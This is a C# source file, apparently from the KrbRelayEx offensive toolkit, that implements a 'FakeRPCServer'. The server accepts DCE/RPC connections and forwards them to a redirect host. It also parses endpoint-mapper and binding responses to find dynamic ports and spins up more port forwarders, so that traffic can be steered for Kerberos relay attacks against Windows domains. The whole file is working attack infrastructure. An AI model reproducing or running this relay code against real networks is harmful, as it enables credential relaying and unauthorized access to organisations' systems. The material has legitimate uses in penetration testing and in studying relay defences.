using KrbRelay;
using KrbRelay.Clients;
using KrbRelay.Clients.Attacks.Ldap;
using SMBLibrary;
using SMBLibrary.Client;
using System;
using System.Collections.Concurrent;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;


using KrbRelayEx.Misc;
using System.ComponentModel;
using System.Text.RegularExpressions;
/// <summary>



public class FakeRPCServer
{
    private Socket _listenerSocket;
    private IPEndPoint _targetEndpoint;
    private ConcurrentDictionary<string, State> _activeConnections = new ConcurrentDictionary<string, State>();

    private int _listenPort;
    private string _targetHost;
    private int _targetPort;
    private bool _isRunning = false;
    public bool ForwardOnly = false;
    public string ServerType = "";
    public byte[] CallID = new byte[] { 0x00, 0x00, 0x00, 0x00 };
    public State state;
    public bool alreadystarted = false;
    public const int PACKET_TYPE_REQUEST = 0;
    public const int PACKET_TYPE_RESPONSE = 2;
    public const int OPNUM_REMOTE_CREATE_INSTANCE = 4;
    public int ISystemActivatorOffset = 0;
    public int IOXidResolverOffset = 0;
    public byte[] AssocGroup = new byte[4];
    

    public FakeRPCServer(int listenPort, string targetHost, int targetPort)
    {
        /*_listenerSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        _listenerSocket.Bind(new IPEndPoint(IPAddress.Any, listenPort));
        _listenerSocket.Listen(100); // Allow up to 100 pending connections
        _targetEndpoint = new IPEndPoint(Dns.GetHostEntry(targetHost).AddressList[0], targetPort);*/
        _listenPort = listenPort;
        _targetHost = targetHost;
        _targetPort = targetPort;

    }
    public FakeRPCServer(int listenPort, string targetHost, int targetPort, string stype)
    {
        /*_listenerSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        _listenerSocket.Bind(new IPEndPoint(IPAddress.Any, listenPort));
        _listenerSocket.Listen(100); // Allow up to 100 pending connections
        _targetEndpoint = new IPEndPoint(Dns.GetHostEntry(targetHost).AddressList[0], targetPort);*/
        _listenPort = listenPort;
        _targetHost = targetHost;
        _targetPort = targetPort;
        ServerType = stype;

    }
    public void Start(bool fwd)
    {
        Console.WriteLine("[*] Starting FakeRPCServer on port:{0}", _listenPort);
        _listenerSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        _listenerSocket.Bind(new IPEndPoint(IPAddress.Any, _listenPort));
        _listenerSocket.Listen(100); // Allow up to 100 pending connections
        IPAddress.TryParse(Program.RedirectHost, out IPAddress ipAddress);
        _targetEndpoint = new IPEndPoint(ipAddress, _targetPort);
        _isRunning = true;
        _listenerSocket.BeginAccept(OnClientConnect, null);

        ForwardOnly = fwd;

    }
    public void Stop()
    {
        if (_isRunning)
        {
           // Console.WriteLine("[*] Stopping FakeRPCServer on port:{0}", _listenPort);
            _isRunning = false;

            // Stop listening for new connections
            _listenerSocket.Close();

            // Close all active connections
            foreach (var kvp in _activeConnections)
            {
                CloseConnection(kvp.Value);
            }

            _activeConnections.Clear();

            //Console.WriteLine("[*] FakeRPCServer {0} stopped.", _listenPort);
        }
    }

    public void ListConnectedClients()
    {
        Console.WriteLine("\n[*] Connected Clients on port:{0}", _listenPort);
        foreach (var key in _activeConnections.Keys)
        {
            Console.WriteLine($"- {key}");
        }
    }

    private void OnClientConnect(IAsyncResult ar)
    {
        try
        {
            Socket clientSocket = _listenerSocket.EndAccept(ar);

            _listenerSocket.BeginAccept(OnClientConnect, null);
            // Create a unique key for this connection
            string clientKey = $"{clientSocket.RemoteEndPoint}-{Guid.NewGuid()}";

            Console.WriteLine($"[*] FakeRPCServer[{_listenPort}]:  Client connected [{clientSocket.RemoteEndPoint}]") ;

            // Create a new connection to the target server
            Socket targetSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            targetSocket.Connect(_targetEndpoint);

            // Create state objects for bidirectional forwarding
            var clientToTargetState = new State(clientSocket, targetSocket);
            var targetToClientState = new State(targetSocket, clientSocket);

            // Add the connection to the dictionary
            _activeConnections[clientKey] = clientToTargetState;

            // Start forwarding data in both directions
            clientSocket.BeginReceive(clientToTargetState.Buffer, 0, clientToTargetState.Buffer.Length, SocketFlags.None, OnDataFromClient, clientToTargetState);
            targetSocket.BeginReceive(targetToClientState.Buffer, 0, targetToClientState.Buffer.Length, SocketFlags.None, OnDataFromTarget, targetToClientState);

            // Continue accepting new connections

        }
        catch (Exception ex)
        {
            //Console.WriteLine($"Error accepting client: {ex.Message}");
        }
    }
    private void OnDataFromClient(IAsyncResult ar)
    {
        state = (State)ar.AsyncState;
        byte[] buffer = new byte[4096];
        
        //if (state.isRelayed)
        //  return;
        //try
        //{
        
        try
        {
            int bytesRead = state.SourceSocket.EndReceive(ar);
            int l = 0;

            if (bytesRead > 0)
            {
                // Forward data to the target
                state.numReads++;
                byte[] b = new byte[2];
                b[0] = state.Buffer[22];
                b[1] = state.Buffer[23];

                int Opnum = BitConverter.ToInt16(b);
                
                {
                    
                    //Console.WriteLine("[*] Type {0}  Opnum :{1} CallId {2}", state.Buffer[2], Opnum, CallID[0]);


                    if (/*Opnum == OPNUM_REMOTE_CREATE_INSTANCE &&*/ state.Buffer[2] == PACKET_TYPE_REQUEST)
                    {
                        CallID[0] = state.Buffer[12];
                        //Console.WriteLine("[*] Onum 4: Type {0}  Opnum :{1} CallId {2}", state.Buffer[2], Opnum, CallID[0]);
                    }
                    /*
                    if (state.Buffer[2] == 2 && state.Buffer[12] == CallID[0])
                    {

                        string securityBinding = Encoding.Unicode.GetString(state.Buffer).TrimEnd('\0');

                        //Console.WriteLine("Decoded Binding String: " + securityBinding);

                        // Step 2: Extract the port using a regular expression
                        string port = Program.ExtractPortFromBinding(securityBinding);
                        if (port != null)
                        {
                            Console.WriteLine($"[*] Extracted Port2: {port}");
                        }
                        else
                        {
                            Console.WriteLine("[-] Port not found in the binding string2.");
                        }
                        //ForwardOnly = true;
                    }*/

                }


                
                
                    state.TargetSocket.Send(state.Buffer, bytesRead, SocketFlags.None);

                    // Continue receiving data from the client


                    // Continue receiving data from the client
                    state.SourceSocket.BeginReceive(state.Buffer, 0, state.Buffer.Length, SocketFlags.None, OnDataFromClient, state);
                    //bytesRead = state.SourceSocket.Receive(state.Buffer);


                

            }
        }

        catch (Exception ex)
        {
            //Console.WriteLine($"Error1 forwarding data from client: {ex.Message}");
            //if (!state.isRelayed)
            CloseConnection(state);
        }
    }


    public static string ExtractPortFromBinding(string binding)
    {
        // Regular expression to capture the port inside square brackets
        Match match = Regex.Match(binding, @"\[(\d+)\]");
        if (match.Success)
        {
            return match.Groups[1].Value;
        }
        return null;
    }

    private void OnDataFromTarget(IAsyncResult ar)
    {
        var state = (State)ar.AsyncState;

        try
        {
            int bytesRead = state.SourceSocket.EndReceive(ar);

            if (bytesRead > 0)
            {
                // Forward data to the client

                state.numReads++;
                byte[] b = new byte[2];
                b[0] = state.Buffer[22];
                b[1] = state.Buffer[23];


                int Opnum = BitConverter.ToInt16(b);
                //Console.WriteLine("[*] Type {0}  Opnum :{1} CallId {2}", state.Buffer[2], Opnum, CallID[0]);
                int epmapoffset = Helpers.PatternAt(state.Buffer, new byte[] { 0x13, 0x00, 0x0D, 0xF7, 0xAF, 0xBE, 0xF6, 0x19, 0x1E, 0xBB, 0x4F, 0x9F, 0x8F, 0xB8, 0x9E, 0x20, 0x18, 0x33, 0x7C, 0x01, 0x00, 0x02, 0x00, 0x00, 0x00 });

                if (state.Buffer[2] == PACKET_TYPE_RESPONSE && state.Buffer[12] == CallID[0] && _listenPort == Program.RpcListenerPort)
                {
                    string securityBinding = Encoding.Unicode.GetString(state.Buffer).TrimEnd('\0');
                    string port = ExtractPortFromBinding(securityBinding);
                    if (port != null)
                    {
                        //Console.WriteLine($"[*] Extracted Port: {port}");
                        int p = int.Parse(port);
                        if (!alreadystarted)
                        {
                            Console.WriteLine($"[*] FakeRPCServer redirecting client to : {port}");
                            PortForwarder RPCtcpFwd = new PortForwarder(p, Program.RedirectHost, p);
                            RPCtcpFwd.StartAsync();
                               // RPCtcpFwd.Start(true);
                            //alreadystarted = true;
                        }


                    }
                    else if (epmapoffset > -1)//EPMAP
                    {
                        b[0] = state.Buffer[bytesRead - 16];
                        b[1] = state.Buffer[bytesRead - 15];
                        int p = (b[0] << 8) | b[1];


                        if (p > 0)
                        {
                            /*   PortForwarder RPCtcpFwd = new PortForwarder(p, Program.RedirectHost, p);
                               RPCtcpFwd.StartAsync();*/
                     
                                //Console.WriteLine("[-] FakeRPCServer {0} Port Foreader not found in the binding string maybe {1:X}{2:X} {3} {4}", _listenPort, b[0], b[1], p, state.Buffer.Length);

                                PortForwarder RPCtcpFwd = new PortForwarder(p, Program.RedirectHost, p);
                                RPCtcpFwd.StartAsync();

                            

                        }


                    }
                    else
                    {
                        //Console.WriteLine("[-] Port not found in the binding string.");
                    }
                    //CloseConnection(state);

                }
                state.TargetSocket.Send(state.Buffer, bytesRead, SocketFlags.None);
             
                // Continue receiving data from the target
                state.SourceSocket.BeginReceive(state.Buffer, 0, state.Buffer.Length, SocketFlags.None, OnDataFromTarget, state);
            }
            else
            {
                // Target server disconnected
                CloseConnection(state);
            }
        }
        catch (Exception ex)
        {
            //Console.WriteLine($"Error forwarding data from target: {ex.Message}");
            CloseConnection(state);
        }
    }


    public void CloseConnection(State state)
    {
        try
        {
            string clientEndpoint = state.SourceSocket.RemoteEndPoint.ToString();
            //Console.WriteLine($"[*] Redirector: Closing connection for {clientEndpoint}");

            state.SourceSocket?.Close();
            state.TargetSocket?.Close();

            // Remove the connection from the dictionary
            string keyToRemove = null;
            foreach (var kvp in _activeConnections)
            {
                if (kvp.Value == state)
                {
                    keyToRemove = kvp.Key;
                    break;
                }
            }

            if (keyToRemove != null)
            {
                _activeConnections.TryRemove(keyToRemove, out _);
            }
        }
        catch (Exception ex)
        {
            //Console.WriteLine($"Error closing connection: {ex.Message}");
        }
    }
}
